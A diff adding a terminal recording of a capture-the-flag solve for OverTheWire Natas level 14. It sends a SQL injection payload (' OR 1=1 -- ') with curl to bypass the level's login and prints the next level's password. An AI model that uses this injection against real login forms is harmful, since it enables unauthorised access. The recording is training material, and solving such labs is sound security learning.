@@ -1,0 +1,5 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793469462,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/natas/L14.sh","title":"Natas L14 solve","env":{"SHELL":"/bin/bash"}}
+[0.012, "o", "$ curl -s -u natas14:<pw> http://natas14.natas.labs.overthewire.org/index-source.html    # SELECT ... username=\"$u\" and password=\"$p\"\r\r\n"]
+[0.888, "o", "SELECT&nbsp\r\r\n$ curl -s -u natas14:<pw> --data-urlencode \"username=\\\" OR 1=1 -- \" --data-urlencode \"password=x\" http://natas14.natas.labs.overthewire.org/\r\r\n"]
+[0.996, "o", "Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g<br><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\r\r\n"]
+[0.003, "x", "0"]
